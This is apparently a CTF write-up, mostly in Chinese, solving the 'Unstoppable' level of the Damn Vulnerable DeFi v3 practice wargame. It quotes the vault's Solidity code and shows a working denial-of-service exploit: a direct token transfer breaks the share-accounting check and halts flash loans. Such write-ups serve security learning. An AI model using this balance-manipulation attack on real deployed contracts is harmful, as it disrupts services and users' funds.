---
title: Damn Vulnerable DeFi V3
tags:
    - blockchain
    - smart contract
    - DeFi
    - flashloan
---

## How to Play

```bash
$ git clone git@github.com:tinchoabbate/damn-vulnerable-defi.git
$ cd damn-vulnerable-defi
$ git checkout v3.0.0
$ yarn install
```

- Code solution in the `test/<challenge-name>/<challenge-name>.challenge.js`
- `yarn run <challenge-name>`

## 1. Unstoppable

> make the vault stop offering flash loans

- ERC4626 实现 ERC20 作为股权代币，`asset` 为 Vault 管理的底层代币
- `UnstoppableVault` 初始持有 $10^6$ DVT (ERC20) 和 $10^6$ oDVT (ERC4626)，`player` 初始持有 $10$ DVT

    ```js
    // unstoppable.challenge.js
    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;

    await token.approve(vault.address, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);
    ```

    ```js
    // ERC4626.sol
    function convertToShares(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply;   // the totalSupply of oDVT
        // 当初始 totalSupply 为 0 时，deposit assets 得到同等数量的 shares
        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
        // (assets * supply) / totalAssets()
    }

    function previewDeposit(uint256 assets) public view virtual returns (uint256) {
        return convertToShares(assets);
    }

    function deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {
        require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

        // Need to transfer before minting or ERC777s could reenter.
        asset.safeTransferFrom(msg.sender, address(this), assets);

        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);

        afterDeposit(assets, shares);
    }
    ```

- 注意到 `convertToShares(totalSupply) != balanceBefore` 在使用依据 `totalSupply`(oDVT) 计算得到的 `shares` 和 `totalAssets()`(`UnstoppableVault` DVT 余额) 进行比较，尽管在初始情况下没有问题，但是... (⃔ *`ω´ * )⃕↝
    - `totalSupply` 只能通过 `deposit` / `mint` 增加，而 `balanceBefore` 可通过 DVT 的 `transfer` 增加
    - 要将 `totalSupply` 转换成 `assets` 应使用 `convertToAssets`

    ```js
    // ReentrancyGuard.sol
    modifier nonReentrant() virtual {
        require(locked == 1, "REENTRANCY");

        locked = 2;

        _;

        locked = 1;
    }
    ```

    ```js
    // UnstoppableVault.sol
    function totalAssets() public view override returns (uint256) {
        assembly {
            // slot 0 对应 ReentrancyGuard 中的 locked
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0);
        if (address(asset) != _token) revert UnsupportedCurrency();
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();

        uint256 fee = flashFee(_token, amount);
        // SafeERC20 wrappers around ERC20 operations that throw on failure
        ERC20(_token).safeTransfer(address(receiver), amount);

        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();

        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        return true;
    }
    ```

- 向 `UnstoppableVault` 发送 DVT 使得 `convertToShares(totalSupply) == balanceBefore` 无法成立就可以阻止闪电贷啦 XD

    ```js
    it('Execution', async function () {
        // get the contracts with player as signer
        token = token.connect(player);

        await token.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    });
    ```

### 参考资料

- [ERC4626](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC4626)
- [BigInt - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt)